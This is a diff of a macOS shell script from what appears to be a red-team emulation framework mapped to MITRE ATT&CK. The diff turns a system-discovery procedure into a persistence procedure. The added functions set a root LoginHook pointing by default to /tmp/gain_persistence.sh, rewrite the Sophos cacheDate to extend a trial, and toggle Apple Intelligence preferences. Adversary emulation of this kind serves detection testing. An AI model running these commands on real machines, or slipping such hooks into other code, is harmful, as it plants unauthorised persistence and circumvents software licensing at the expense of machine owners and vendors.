@@ -1,11 +1,11 @@
 #!/bin/sh
 # POSIX-compliant
-# Procedure Name: system_info
-# Tactic: Discovery
-# Technique: T1082
-# GUID: 0c0f2db0-16fe-49cc-9d0f-2ec457872374
-# Intent: Discovers detailed system information on macOS systems using native commands for enumeration.
-# Author: @darmado
+# Procedure Name: modify_preferences
+# Tactic: Persistence
+# Technique: T1547
+# GUID: 29bffb23-e685-46d1-841e-00eea59ea19e
+# Intent: Establish persistence by modifying system login preferences and extending application trial periods using defaults write commands
+# Author: @darmado | https://x.com/darmad0
 # created: 2025-01-27
 # Updated: 2025-05-30
 # Version: 1.0.0
@@ -19,8 +19,8 @@
 #------------------------------------------------------------------------------
 NAME="" 
 # MITRE ATT&CK Mappings
-TACTIC="Discovery" #replace with you coresponding tactic
-TTP_ID="T1082" #replace with you coresponding ttp_id
+TACTIC="Persistence" #replace with you coresponding tactic
+TTP_ID="T1547" #replace with you coresponding ttp_id
 
 TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
 TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
@@ -92,27 +92,18 @@ CMD_WC="wc"
 CMD_CAT="cat"
 CMD_LSOF="lsof"
 
-INPUT_HELP=""
-VERBOSE=false
-ALL=false
-SYSTEM=false
-HARDWARE=false
-ENV=false
-NETWORK=false
-BOOT=false
-POWER=false
+INPUT_LOGIN_HOOK=""
+EXTEND_SOPHOS=false
+AI_MANIPULATION=false
+CHECK_PERSISTENCE=false
 
-VERBOSE=False
-ALL=False
-SYSTEM=False
-HARDWARE=False
-ENV=False
-NETWORK=False
-BOOT=False
-POWER=False
+CMD_DEFAULTS="defaults"
+CMD_SUDO="sudo"
+DEFAULT_HOOK_PATH="/tmp/gain_persistence.sh"
+SOPHOS_TRIAL_DATE="2026-05-30 08:46:00 +0000"
 
 # Procedure Information (set by build system)
-PROCEDURE_NAME="system_info"  # Set by build system from YAML procedure_name field
+PROCEDURE_NAME="modify_preferences"  # Set by build system from YAML procedure_name field
 
 # Function execution tracking
 FUNCTION_LANG=""  # Ued by log_output at execution time
@@ -579,39 +570,24 @@ core_parse_args() {
                 fi
                 ;;
 # We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
-        --help)
+        --login-hook)
             if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
                 MISSING_VALUES="$MISSING_VALUES $1"
             elif [ -n "$2" ]; then
-                INPUT_HELP="$2"
+                INPUT_LOGIN_HOOK="$2"
                     shift
             else
                 MISSING_VALUES="$MISSING_VALUES $1"
                 fi
                 ;;
-        --verbose)
-            VERBOSE=true
+        --extend-sophos)
+            EXTEND_SOPHOS=true
             ;;
-        --all)
-            ALL=true
+        --ai-manipulation)
+            AI_MANIPULATION=true
             ;;
-        --system)
-            SYSTEM=true
-            ;;
-        --hardware)
-            HARDWARE=true
-            ;;
-        --env)
-            ENV=true
-            ;;
-        --network)
-            NETWORK=true
-            ;;
-        --boot)
-            BOOT=true
-            ;;
-        --power)
-            POWER=true
+        --check-persistence)
+            CHECK_PERSISTENCE=true
             ;;
             *)
                 # Collect unknown arguments for error reporting
@@ -650,15 +626,10 @@ Basic Options:
   -h, --help           Display this help message
   -d, --debug          Enable debug output (includes verbose output)
   -a, --all            Process all available data (technique-specific)
-  --help VALUE              Display help message with detailed command information
-  --verbose                 Enable verbose output with timestamps and user context
-  --all                     Run all system discovery checks (combines all options below)
-  --system                  Basic system information using sw_vers, uname, and hostname commands
-  --hardware                Hardware details using sysctl and system_profiler commands (CPU, memory, serial numbers)
-  --env                     Environment variables and locale settings using env and locale commands
-  --network                 Network configuration using ifconfig and scutil commands (interfaces, DNS)
-  --boot                    Boot and security settings using csrutil and spctl commands (SIP, Gatekeeper)
-  --power                   Power and battery information using system_profiler and ioreg commands
+  --login-hook VALUE        Set login hook for persistence
+  --extend-sophos           Extend Sophos trial cache date
+  --ai-manipulation         Manipulate Apple Intelligence settings
+  --check-persistence       Check current persistence mechanisms
 
 Output Options:
   --format TYPE        Output format: 
@@ -1886,77 +1857,36 @@ raw_output=""
 # Set global function language for this procedure
 FUNCTION_LANG="shell"
 
-# Execute functions for --help
-if [ "$HELP" = true ]; then
-    core_debug_print "Executing functions for --help"
-fi
-
-# Execute functions for --verbose
-if [ "$VERBOSE" = true ]; then
-    core_debug_print "Executing functions for --verbose"
-fi
-
-# Execute functions for --all
-if [ "$ALL" = true ]; then
-    core_debug_print "Executing functions for --all"
-    result=$(check_basic_system_info)
-    raw_output="${raw_output}${result}\n"
-    result=$(check_hardware_info)
-    raw_output="${raw_output}${result}\n"
-    result=$(check_environment_info)
-    raw_output="${raw_output}${result}\n"
-    result=$(check_network_config)
-    raw_output="${raw_output}${result}\n"
-    result=$(check_boot_security)
-    raw_output="${raw_output}${result}\n"
-    result=$(check_power_info)
+# Execute functions for --login-hook
+if [ "$LOGIN_HOOK" = true ]; then
+    core_debug_print "Executing functions for --login-hook"
+    result=$(set_login_hook)
     raw_output="${raw_output}${result}\n"
 fi
 
-# Execute functions for --system
-if [ "$SYSTEM" = true ]; then
-    core_debug_print "Executing functions for --system"
-    result=$(check_basic_system_info)
+# Execute functions for --extend-sophos
+if [ "$EXTEND_SOPHOS" = true ]; then
+    core_debug_print "Executing functions for --extend-sophos"
+    result=$(extend_sophos_trial)
     raw_output="${raw_output}${result}\n"
 fi
 
-# Execute functions for --hardware
-if [ "$HARDWARE" = true ]; then
-    core_debug_print "Executing functions for --hardware"
-    result=$(check_hardware_info)
+# Execute functions for --ai-manipulation
+if [ "$AI_MANIPULATION" = true ]; then
+    core_debug_print "Executing functions for --ai-manipulation"
+    result=$(manipulate_ai_settings)
     raw_output="${raw_output}${result}\n"
 fi
 
-# Execute functions for --env
-if [ "$ENV" = true ]; then
-    core_debug_print "Executing functions for --env"
-    result=$(check_environment_info)
-    raw_output="${raw_output}${result}\n"
-fi
-
-# Execute functions for --network
-if [ "$NETWORK" = true ]; then
-    core_debug_print "Executing functions for --network"
-    result=$(check_network_config)
-    raw_output="${raw_output}${result}\n"
-fi
-
-# Execute functions for --boot
-if [ "$BOOT" = true ]; then
-    core_debug_print "Executing functions for --boot"
-    result=$(check_boot_security)
-    raw_output="${raw_output}${result}\n"
-fi
-
-# Execute functions for --power
-if [ "$POWER" = true ]; then
-    core_debug_print "Executing functions for --power"
-    result=$(check_power_info)
+# Execute functions for --check-persistence
+if [ "$CHECK_PERSISTENCE" = true ]; then
+    core_debug_print "Executing functions for --check-persistence"
+    result=$(check_persistence_status)
     raw_output="${raw_output}${result}\n"
 fi
 
 # Set procedure name for processing
-procedure="system_info"
+procedure="modify_preferences"
         # This section is intentionally left empty as it will be filled by
         # technique-specific implementations when sourcing this base script
         # If no raw_output is set by the script, exit gracefully
@@ -2122,79 +2052,83 @@ core_generate_encryption_key() {
 
 # Functions from YAML procedure
 
-# Function: check_basic_system_info
-# Description: check_basic_system_info - Generated from YAML
-check_basic_system_info() {
-
-    printf "[$(core_get_timestamp)]: user: $USER; msg: Basic System Information\n"
-    printf "OS Version:\n$(sw_vers 2>/dev/null)\n"
-    printf "Kernel Information:\n$(uname -a 2>/dev/null)\n"
-    printf "Host Information:\n$(hostname -f 2>/dev/null)\n"
-
+# Function: set_login_hook
+# Description: set_login_hook - Generated from YAML
+set_login_hook() {
+    $CMD_PRINTF "PERSISTENCE_TYPE|COMMAND|RESULT\n"
+    
+    # Use provided path or default
+    local hook_path="${INPUT_LOGIN_HOOK:-$DEFAULT_HOOK_PATH}"
+    
+    # Set login hook
+    local result
+    result=$($CMD_SUDO $CMD_DEFAULTS write /Library/Preferences/com.apple.loginwindow LoginHook "$hook_path" 2>&1)
+    $CMD_PRINTF "LOGIN_HOOK|sudo defaults write /Library/Preferences/com.apple.loginwindow LoginHook|%s\n" "$result"
+    
+    return 0
 }
 
-# Function: check_hardware_info
-# Description: check_hardware_info - Generated from YAML
-check_hardware_info() {
 
-    printf "[$(core_get_timestamp)]: user: $USER; msg: Hardware Information\n"
-    printf "CPU Information:\n"
-    printf "$(sysctl -n machdep.cpu.brand_string 2>/dev/null)\n"
-    printf "$(sysctl -n hw.ncpu 2>/dev/null) processors\n"
-    printf "Memory Information:\n"
-    printf "$(sysctl -n hw.memsize 2>/dev/null) bytes total\n"
-    printf "Hardware Model:\n"
-    printf "$(system_profiler SPHardwareDataType 2>/dev/null | grep 'Model Name\|Model Identifier\|Serial Number' 2>/dev/null)\n"
-
+# Function: extend_sophos_trial
+# Description: extend_sophos_trial - Generated from YAML
+extend_sophos_trial() {
+    $CMD_PRINTF "PERSISTENCE_TYPE|COMMAND|RESULT\n"
+    
+    # Read current Sophos trial date
+    local current_date
+    current_date=$($CMD_DEFAULTS read com.sophos.ipm cacheDate 2>/dev/null)
+    $CMD_PRINTF "SOPHOS_CURRENT|defaults read com.sophos.ipm cacheDate|%s\n" "$current_date"
+    
+    # Extend Sophos trial cache date
+    local result
+    result=$($CMD_DEFAULTS write com.sophos.ipm cacheDate "$SOPHOS_TRIAL_DATE" 2>&1)
+    $CMD_PRINTF "SOPHOS_EXTEND|defaults write com.sophos.ipm cacheDate|%s\n" "$result"
+    
+    return 0
 }
 
-# Function: check_environment_info
-# Description: check_environment_info - Generated from YAML
-check_environment_info() {
 
-    printf "[$(core_get_timestamp)]: user: $USER; msg: Environment Information\n"
-    printf "Environment Variables:\n"
-    printf "$(env 2>/dev/null | grep -v 'PASSWORD\|KEY\|SECRET\|TOKEN' 2>/dev/null)\n"
-    printf "Locale Settings:\n"
-    printf "$(locale 2>/dev/null)\n"
-
+# Function: manipulate_ai_settings
+# Description: manipulate_ai_settings - Generated from YAML
+manipulate_ai_settings() {
+    $CMD_PRINTF "PERSISTENCE_TYPE|COMMAND|RESULT\n"
+    
+    # Disable Apple Intelligence
+    local disable_result
+    disable_result=$($CMD_DEFAULTS write com.apple.CloudSubscriptionFeatures.optIn 545129924 -bool false 2>&1)
+    $CMD_PRINTF "AI_DISABLE|defaults write com.apple.CloudSubscriptionFeatures.optIn 545129924 -bool false|%s\n" "$disable_result"
+    
+    # Enable Apple Intelligence
+    local enable_result
+    enable_result=$($CMD_DEFAULTS write com.apple.CloudSubscriptionFeatures.optIn 545129924 -bool true 2>&1)
+    $CMD_PRINTF "AI_ENABLE|defaults write com.apple.CloudSubscriptionFeatures.optIn 545129924 -bool true|%s\n" "$enable_result"
+    
+    return 0
 }
 
-# Function: check_network_config
-# Description: check_network_config - Generated from YAML
-check_network_config() {
 
-    printf "[$(core_get_timestamp)]: user: $USER; msg: Network Configuration\n"
-    printf "Network Interfaces:\n"
-    printf "$(ifconfig 2>/dev/null)\n"
-    printf "DNS Configuration:\n"
-    printf "$(scutil --dns 2>/dev/null)\n"
-
-}
-
-# Function: check_boot_security
-# Description: check_boot_security - Generated from YAML
-check_boot_security() {
-
-    printf "[$(core_get_timestamp)]: user: $USER; msg: Boot and Security Settings\n"
-    printf "System Integrity Protection Status:\n"
-    printf "$(csrutil status 2>/dev/null)\n"
-    printf "Gatekeeper Status:\n"
-    printf "$(spctl --status 2>/dev/null)\n"
-
-}
-
-# Function: check_power_info
-# Description: check_power_info - Generated from YAML
-check_power_info() {
-
-    printf "[$(core_get_timestamp)]: user: $USER; msg: Power Information\n"
-    printf "Power Status:\n"
-    printf "$(system_profiler SPPowerDataType 2>/dev/null)\n"
-    printf "Battery Information:\n"
-    printf "$(ioreg -rn AppleSmartBattery 2>/dev/null)\n" 
-    printf "$(ioreg -rn AppleSmartBattery 2>/dev/null)\n" 
-}
+# Function: check_persistence_status
+# Description: check_persistence_status - Generated from YAML
+check_persistence_status() {
+    $CMD_PRINTF "PERSISTENCE_TYPE|COMMAND|RESULT\n"
+    
+    # Check login hook
+    local login_hook
+    login_hook=$($CMD_SUDO $CMD_DEFAULTS read /Library/Preferences/com.apple.loginwindow LoginHook 2>/dev/null)
+    $CMD_PRINTF "LOGIN_HOOK_CHECK|sudo defaults read /Library/Preferences/com.apple.loginwindow LoginHook|%s\n" "$login_hook"
+    
+    # Check Sophos trial date
+    local sophos_date
+    sophos_date=$($CMD_DEFAULTS read com.sophos.ipm cacheDate 2>/dev/null)
+    $CMD_PRINTF "SOPHOS_DATE_CHECK|defaults read com.sophos.ipm cacheDate|%s\n" "$sophos_date"
+    
+    # Check AI settings
+    local ai_setting
+    ai_setting=$($CMD_DEFAULTS read com.apple.CloudSubscriptionFeatures.optIn 545129924 2>/dev/null)
+    $CMD_PRINTF "AI_SETTING_CHECK|defaults read com.apple.CloudSubscriptionFeatures.optIn 545129924|%s\n" "$ai_setting"
+    
+    return 0
+} 
 
 
 JOB_ID=$(core_generate_job_id)
